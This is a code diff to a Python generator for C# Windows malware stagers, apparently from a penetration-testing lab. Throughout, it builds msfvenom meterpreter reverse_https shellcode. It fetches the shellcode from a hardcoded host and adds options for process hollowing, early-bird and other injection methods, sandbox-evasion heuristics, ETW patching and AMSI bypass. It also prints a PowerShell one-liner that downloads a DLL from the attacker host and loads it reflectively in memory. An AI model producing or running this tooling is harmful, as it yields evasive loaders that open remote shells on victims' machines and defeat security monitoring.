@@ -4,25 +4,11 @@ import os
 import subprocess
 import argparse
 
-BASE_FILENAME = 'win_msf_sliver_stager'
+BASE_FILENAME = 'win_msf_stager'
 FN_CS = BASE_FILENAME + ".cs"
 
 MSFVENOM_CMD = f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={ak.LHOST} LPORT={ak.LPORT} -f raw -e generic/none"
 STAGER_URL = "http://192.168.49.65/sc"
-
-import_choices = {
-  'hollowing':f"{ak.START_PROCESS_HOLLOW_IMPORT}",
-  'ntcreate':f"{ak.START_PROCESS_INTERPROCESS_IMPORT}",
-  'earlybird':f"{ak.START_PROCESS_EARLYBIRD_IMPORT}",
-  'standard':f"{ak.START_SHELLCODE_IMPORT}"
-}
-
-main_choices = {
-  'hollowing':f"{ak.START_PROCESS_HOLLOW_CODE}",
-  'ntcreate':f"{ak.START_PROCESS_INTERPROCESS_CODE}",
-  'earlybird':f"{ak.START_PROCESS_EARLYBIRD_CODE}",
-  'standard':f"{ak.START_SHELLCODE}"
-}
 
 templates = {
   'exe': """
@@ -31,7 +17,7 @@ using System.Net;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
 
-namespace SliverStager
+namespace LeMans
 {{
     public class Stager
     {{
@@ -74,24 +60,32 @@ def get_shellcode(msfvenom_cmd):
 def generate(args):
   url_dl_code = ak.URL_DL_CODE.format(STAGER_URL=STAGER_URL)
 
-  imports = f"""
-        {ak.HEURISTICS_IMPORT}
-        {ak.ARCH_DETECTION}
-        {ak.ETW_FUNCS}
-        {ak.AMSI_BYPASS_IMPORT}
-  """
+  # Create obfuscator for loaders that need obfuscation
+  exe_path = b"C:\\\\Windows\\system32\\svchost.exe"
+  path_obfuscated = ak.Obfuscator(exe_path, b'\x09')
 
-  main_code = f"""
-            {ak.HEURISTICS_CODE}
-            {ak.ETW_PATCH}
-            {url_dl_code}
-  """
+  imports = f"""{ak.ARCH_DETECTION}"""
+  main_code = f"""{url_dl_code}"""
 
-  imports += import_choices[args.injection]
-  main_code += main_choices[args.injection]
+  if args.heuristics:
+    imports += f"{ak.HEURISTICS_IMPORT}"
+    main_code += f"{ak.HEURISTICS_CODE}"
 
+  if args.etw:
+    imports += f"{ak.ETW_FUNCS}"
+    main_code += f"{ak.ETW_PATCH}"
+
+  if args.amsi:
+    imports += f"{ak.AMSI_BYPASS_IMPORT}"
+    main_code += f"{ak.AMSI_BYPASS_CODE}"
+
+  imports += ak.import_choices[args.injection]
+  main_code += ak.main_choices[args.injection].format(ak=ak,
+                                                      xor_path=path_obfuscated.get_hex_csharp(),
+                                                      xor_key=path_obfuscated.get_key_csharp())
+
+  # Make csharp template
   template = templates[args.format].format(imports=imports,main_code=main_code)
-
   ak.write_file(FN_CS, template)
 
 
@@ -103,8 +97,12 @@ def main():
   # generate_shellcode()
 
   parser = argparse.ArgumentParser()
-  parser.add_argument('--injection', '-i', default='standard', choices=['standard', 'earlybird', 'ntcreate', 'hollowing'])
+  parser.add_argument('--injection', '-i', default='standard', choices=ak.main_choices.keys())
   parser.add_argument('--format', '-f', default='exe', choices=['exe', 'dll'])
+  parser.add_argument('--heuristics', default=True, action=argparse.BooleanOptionalAction)
+  parser.add_argument('--amsi', default=False, action=argparse.BooleanOptionalAction)
+  parser.add_argument('--etw', default=True, action=argparse.BooleanOptionalAction)
+
   args = parser.parse_args()
 
   generate(args)
@@ -119,13 +117,13 @@ def main():
   if args.format == 'dll':
       print("Load with:")
       ps = """
-    $data = (New-Object System.Net.WebClient).DownloadData('http://{lhost}/{fn}')
-    $assem = [System.Reflection.Assembly]::Load($data)
+      $data = (New-Object System.Net.WebClient).DownloadData('http://{lhost}/{fn}')
+      $assem = [System.Reflection.Assembly]::Load($data)
 
-    $class = $assem.GetType('LeMans.Class1')
-    $method = $class.GetMethod("ferrari")
-    $method.Invoke(0, $null)
-    """.format(fn=BASE_FILENAME + '.dll', lhost=ak.LHOST)
+      $class = $assem.GetType('LeMans.Class1')
+      $method = $class.GetMethod("ferrari")
+      $method.Invoke(0, $null)
+      """.format(fn=BASE_FILENAME + '.dll', lhost=ak.LHOST)
       print(ps)
 
 if __name__ == "__main__":
